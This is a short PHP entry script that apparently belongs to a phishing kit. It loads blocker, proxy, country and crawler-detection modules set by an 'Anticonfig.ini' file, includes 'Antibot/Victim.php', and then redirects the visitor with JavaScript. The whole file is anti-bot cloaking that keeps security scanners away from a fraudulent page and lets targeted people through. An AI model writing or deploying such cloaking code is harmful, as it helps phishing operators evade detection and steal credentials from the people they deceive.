<?php
require_once 'blocker.php';
require_once 'proxy.php';
require_once 'country.php';
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_crawlerdetect = $tanitatikaram['crawlerdetect'];
if ($setting_crawlerdetect == 'on') {
    require_once 'crawlerdetect.php';
}
require_once 'Antibot/Victim.php';
echo "<script>window.location.href = '../../';</script>";
?>